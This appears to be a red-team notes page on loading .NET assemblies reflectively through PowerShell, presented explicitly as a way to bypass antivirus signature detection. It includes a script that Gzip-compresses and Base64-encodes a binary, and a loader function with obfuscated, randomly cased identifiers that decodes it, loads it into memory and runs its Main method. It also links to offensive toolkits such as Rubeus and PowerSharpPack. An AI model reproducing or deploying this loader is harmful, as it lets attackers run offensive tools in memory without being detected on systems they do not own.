# .NET Reflective Assembly

* [https://pscustomobject.github.io/powershell/howto/PowerShell-Add-Assembly/](https://pscustomobject.github.io/powershell/howto/PowerShell-Add-Assembly/)
* [https://github.com/S3cur3Th1sSh1t/PowerSharpPack#powersharppack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack#powersharppack)
* [https://github.com/GhostPack/Rubeus#sidenote-running-rubeus-through-powershell](https://github.com/GhostPack/Rubeus#sidenote-running-rubeus-through-powershell)
* [https://github.com/cfalta/PowerShellArmoury/blob/master/ConvertTo-Powershell.ps1](https://github.com/cfalta/PowerShellArmoury/blob/master/ConvertTo-Powershell.ps1)
* [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/convert_c%23_to_ps1.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/convert_c%23_to_ps1.ps1)

A way to bypass AV signature analysis: you can Gzip-compress and Base64-encode a .NET assembly to load it reflectively via PowerShell right from memory (when compiling the binary, make `Program` class and its `Main` method public):

{% code title="CompressEncodeAssembly.ps1" %}
```powershell
$bytes = [System.IO.File]::ReadAllBytes("\path\to\binary.exe")
[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
$gzipStream = New-Object System.IO.Compression.GzipStream($output, [System.IO.Compression.CompressionMode]::Compress)
$gzipStream.Write($bytes, 0, $bytes.Length)
$gzipStream.Close()
$output.Close()
[byte[]] $byteOutArray = $output.ToArray()
$encodedZipped = [System.Convert]::ToBase64String($byteOutArray)
$encodedZipped
```
{% endcode %}

This [blog post](https://www.praetorian.com/blog/running-a-net-assembly-in-memory-with-meterpreter) covers the topic in depth.

An example how the binary can be actually decoded, decompressed and run from memory:

```powershell
function Invoke-SomeBinary
{
	[CmdletBinding()]

	PARAM (
		[Parameter(Position = 0, Mandatory = $true)]
		[ValidateNotNullorEmpty()]
		[String]
		$cOmmANd
	)

	$a = NeW-obJeCt sYsTeM.Io.MEMoRysTREaM(,[coNveRT]::frombaSE64sTrINg(""))
	$DEcoMpRESSEd = nEw-obJEct SYsteM.io.CompREsSION.gzIPsTreaM($a, [sYstEM.iO.COMPrEssION.CompRESsIonMODE]::decOmPRESs)
	$OUtpuT = New-oBjeCt SySTeM.IO.MEmorYstREam
	$dEcoMPReSSEd.copYto( $outPUt )
	[BYte[]] $ByTEOuTarrAy = $OUtPUT.toarrAY()
	$RAs = [sySTeM.REfLecTIOn.ASSEmBlY]::load($bYTeOUTArraY)
	$olDconsOLeOuT = [CONSoLe]::out
	$StRInGwritEr = nEW-ObJEct System.IO.STRiNgwRiTEr
	[cONSOLE]::sEtOut($STringWRITer)

	[SomeBinary.Program]::maiN($COMmaND.SPliT(" "))

	[cOnsolE]::sEtout($olDCONsOleout)
	$resUlTs = $sTRInGWRiter.TOSTring()
	$rESuLTs
}
```
